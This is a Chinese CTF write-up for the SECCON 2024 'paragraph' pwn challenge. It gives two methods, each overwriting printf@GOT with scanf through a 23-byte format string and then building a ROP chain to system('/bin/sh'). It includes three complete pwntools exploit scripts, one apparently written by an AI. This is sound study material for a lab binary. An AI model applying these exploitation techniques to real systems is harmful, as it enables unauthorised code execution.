# paragraph

该题来自 [SECCON 2024 Quals](https://github.com/sajjadium/ctf-archives/tree/main/ctfs/SECCON/2024/Quals/pwn/Paragraph)，反编译：

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char format[32]; // [rsp+0h] [rbp-20h] BYREF

  setbuf(stdin, nullptr);
  setbuf(stdout, nullptr);
  puts("\"What is your name?\", the black cat asked.");
  __isoc99_scanf("%23s", format);
  printf(format);
  printf(" answered, a bit confused.\n\"Welcome to SECCON,\" the cat greeted %s warmly.\n", format);
  return 0;
}
```

## 方法一

可以进行格式化字符串攻击，这里主要的问题是限制 23 字节，因此没法写太多数据。分析 libc 的符号：

- __isoc23_scanf 在 0x5fa50
- printf 在 0x600f0

如果 libc 基地址以 0x1000 结尾，那么这两个函数的地址变为：

- __isoc23_scanf 在 0x60a50
- printf 在 0x610f0

这个时候，只需要覆盖 printf 的低 2 字节为 0x0a50，后续对 printf 的调用就是调用 scanf，这样就可以在最后一个 scanf 里进行任意长度的栈溢出。

与此同时，还有足够的空间来 leak libc 地址：%11$p。

这样，就可以完成后续的 ROP chain，pop rdi，再调用 system：

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

while True:
    if args.REMOTE:
        p = remote(args.HOST, args.PORT)
    else:
        p = process("strace -o strace.log ./chall.patched", shell=True)
        # p = process("./chall.patched")
    elf = ELF("./chall.patched")
    libc = elf.libc

    # override printf to __isoc23_scanf, 1/16 success probability
    p.recvuntil(b"black cat asked.")
    # __isoc23_scanf @ 0x5fa50
    # printf @ 0x600f0
    # we hope that libc base ends in 0x1000:
    # __isoc23_scanf becomes 0x60a50
    # printf becomes 0x610f0
    # the override works!
    val = libc.symbols["__isoc23_scanf"] & 0xFFF
    fmt = flat({0: f"%{val}c%8$hn%11$p".encode(), 16: elf.got["printf"]})

    # pause()
    # gdb.attach(p)

    p.send(fmt[:23])

    p.recvuntil(b"0x")
    addr = int(p.recvuntil(p64(elf.got["printf"])[:3], drop=True)[:12].decode(), 16)
    # return address for call *%rax in glibc
    libc_addr = addr - 0x7FD89220E1CA + 0x7FD8921E4000
    print(f"libc 0x{libc_addr:x}")
    libc.address = libc_addr

    rop = ROP(libc)
    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    # now we can override stack to get shell
    sh_addr = next(libc.search(b"/bin/sh\x00"))
    payload = (
        b"A" * 0x28
        + p64(pop_rdi_ret)
        + p64(sh_addr)
        + p64(ret)
        + p64(libc.symbols["system"])
    )
    payload = (
        b' answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
        + payload
        + b" warmly.\na" # trailing a required to let scanf return
    )
    try:
        p.sendline(payload)
        p.sendline(b"id")
        p.recvuntil(b"uid")
    except KeyboardInterrupt:
        break
    except:
        p.close()
        continue

    p.interactive()
    break
```

提供上述提示后，用 AI 完成的攻击代码：

```python
#!/usr/bin/env python3
"""
One-shot format string with a 23-byte buffer.

1. Partial-overwrite printf@GOT (0x404028) low 2 bytes: printf -> __isoc23_scanf
   (0x5fa50). Both share high bytes since (base16+0xfa50) and (base16+0x600f0)
   carry identically into byte 2 for base16 in [0x1000, 0xe000].
   count = (base16 + 0xfa50) & 0xffff must be <= 4 digits to fit the %11$p leak
   in 23 bytes, so base16 must be 0x1000 (2640) or 0x2000 (6736); we verify the
   guess with the leaked base16 and retry on fresh ASLR.

2. The final printf(" answered...%s warmly.\n", name) is now scanf: %s reads an
   unbounded word into name -> stack overflow -> ROP: ret; pop rdi; "/bin/sh"; system.

3. scanf swallows one extra char after the trailing "\n" (ungetc fails on the
   unbuffered stdin), so a sacrificial 'x' is sent before the shell takes over.
"""
from pwn import *
import re
import time
import random

context.binary = './chall'
context.log_level = 'info'

# ---- libc / binary offsets ----
RET_MAIN_OFF = 0x2a1ca   # main's saved ret = base + 0x2a1ca
SCANF23_OFF  = 0x5fa50   # __isoc23_scanf
SYSTEM_OFF   = 0x58740
BINSH_OFF    = 0x1cb42f
POP_RDI      = 0x401283
RET_GADGET   = 0x40101a
PRINTF_GOT   = 0x404028

WS = b'\x09\x0a\x0b\x0c\x0d\x20'


def start():
    return process(['./ld-linux-x86-64.so.2', '--library-path', '.', './chall'])


def leak_base(p):
    """read the %11$p leak -> libc base (or None)"""
    out = b''
    end = time.time() + 3
    while time.time() < end:
        try:
            chunk = p.recv(timeout=0.3)
        except EOFError:
            break
        if not chunk:
            continue
        out += chunk
        if b'0x' in out:
            break
    m = re.search(rb'0x[0-9a-f]+', out)
    if not m:
        return None
    return int(m.group(0), 16) - RET_MAIN_OFF


def try_exploit(count):
    """one connection; return process with a live shell, or None"""
    p = start()
    p.recvuntil(b'asked.\n')

    # 23 bytes: %{count}c%8$hn%11$p + "\x28\x40\x40" + 4 NULs
    #   arg8 = printf@GOT ; %hn writes count (= __isoc23_scanf low16) ; %11$p leaks libc
    payload = f'%{count}c%8$hn%11$p'.encode() + p64(PRINTF_GOT)[:3] + b'\x00' * 4
    assert len(payload) == 23, len(payload)
    p.send(payload)

    base = leak_base(p)
    if base is None:
        p.close()
        return None
    # verify guessed count matched the real base16 (i.e. the %hn write is correct)
    if (base & 0xffff) != ((count - SCANF23_OFF) & 0xffff):
        p.close()
        return None

    # ROP over the scanf %s overflow:
    #   name@rbp-0x20 ; saved rbp at +32 ; saved ret at +40 ; chain continues at +48
    system = base + SYSTEM_OFF
    binsh = base + BINSH_OFF
    rop = b'A' * 32 + p64(0) + p64(RET_GADGET) + p64(POP_RDI) + p64(binsh) + p64(system)
    if any(b in WS for b in rop):
        p.close()
        return None

    # second "printf" is now __isoc23_scanf: match the literal prefix, %s reads our
    # ROP (no whitespace!) into name -> overflow -> main returns into our ROP chain.
    prefix = b'answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
    p.send(prefix + rop + b' warmly.\nx')   # 'x' is swallowed by scanf
    return p


def main():
    for i in range(200):
        count = random.choice([2640, 6736])   # base16 0x1000 / 0x2000
        p = try_exploit(count)
        if p is not None:
            log.success(f'got shell! (base16 = {((count - 0xfa50) & 0xffff):#x}, attempt {i})')
            p.interactive()
            return
        if i % 10 == 0:
            log.info(f'[attempt {i}] retrying...')
    log.failure('all attempts failed')


if __name__ == '__main__':
    main()
```

## 方法二

不过，在 redbud 的平台上跑的时候，leak 出来的 libc 地址总是以 0x5000 或 0xd000 结尾，上面的办法就不 work 了，因为没有足够的空间来 leak libc 了。不过，另辟蹊径，还是实现了类似的结果：

首先，还是要覆盖 printf 的低地址，这次用的是 scanf 本体：

- scanf 在 0x66290
- printf 在 0x600f0

如果 libc 基地址以 0x5000 结尾，那么这两个函数的地址变为：

- scanf 在 0x6ba50
- printf 在 0x650f0

那么，这次要写入的就是 0xba50，让 printf 变成 scanf。此时就没法 leak libc 了，转而在后续的 ROP chain 里 leak：

1. pop rdi + got puts + plt puts，调用 puts(puts)，从而 leak libc
2. 回到 main 函数的 scanf("%23s", format) 前面的位置（0x4011DD），把 rsi 指向 got 表中 printf 前面的位置，这样就可以用这个 scanf 来修改 printf 地址为 system
3. 与此同时，把 rbp 也指向 got 表，这样一次 scanf 可以完成 "sh" 的植入，以及 printf 地址的修改
4. 后续执行 scanf 之前，已经通过 puts 获取 libc 地址，因此后续再把 system 的地址发过去即可

```python
from pwn import *

context(log_level="DEBUG")
context.terminal = ["tmux", "split-w", "-h"]
context.arch = "amd64"

while True:
    if args.REMOTE:
        p = remote(args.HOST, args.PORT)
    else:
        # p = process("strace -F -o strace.log ./chall.patched", shell=True)
        p = process("./chall.patched")
    elf = ELF("./chall.patched")
    libc = elf.libc

    # override printf to scanf, 1/16 success probability
    p.recvuntil(b"black cat asked.")
    # scanf @ 0x66290
    # printf @ 0x600f0
    # we hope that libc base ends in 0x5000:
    # printf becomes 0x650f0
    # scanf becomes 0x6ba50
    # the override works!
    val = (libc.symbols["scanf"] & 0xFFF) + 0xB000
    fmt = flat({0: f"%{val}c%8$hn".encode(), 16: elf.got["printf"]})

    # pause()
    # gdb.attach(p)

    p.send(fmt[:23])

    rop = ROP(elf)
    pop_rsi_pop_r15_ret = rop.find_gadget(["pop rsi", "pop r15", "ret"]).address
    pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"]).address
    pop_rbp_ret = rop.find_gadget(["pop rbp", "ret"]).address
    ret = rop.find_gadget(["ret"]).address

    # now we can override stack to return to main
    # 0x4011dd: before scanf
    payload = (
        cyclic(0x28)
        # puts(puts): leak libc
        + p64(pop_rdi_ret)
        + p64(elf.got["puts"])
        + p64(elf.plt["puts"])
        # scanf("%23s", printf - 1 - 4)
        # why 1: the z in payload below
        # why 4: store the sh
        + p64(pop_rsi_pop_r15_ret)
        + p64(elf.got["printf"] - 1 - 4)
        + p64(0)
        # rbp: used for arg of system called via printf plt
        + p64(pop_rbp_ret)
        # note the 0x20 offset in lea -0x20(%rbp), %rax
        + p64(elf.got["printf"] - 4 + 0x20)
        + p64(0x4011DD)
    )
    payload = (
        b' answered, a bit confused.\n"Welcome to SECCON," the cat greeted '
        + payload
        + b" warmly.\nz"  # the latest z is required for scanf to stop
    )
    try:
        # end of fmt
        p.recvuntil(b"daaa")
        p.send(payload)
        # read leaked libc address back
        puts_resp = p.recvuntil(b"\x7f")[-6:]
    except KeyboardInterrupt:
        break
    except:
        p.close()
        continue

    puts_addr = u64(puts_resp + b"\x00\x00")
    libc_addr = puts_addr - libc.symbols["puts"]
    print(f"libc 0x{libc_addr:x}")
    libc.address = libc_addr

    # pause()
    # gdb.attach(p)

    # call system("sh")
    p.sendline(b"sh\x00\x00" + p64(libc.symbols["system"]))
    p.sendline(b"id")
    p.interactive()
    break
```

See also: <https://blog.rosay.xyz/seccon-reflections/>
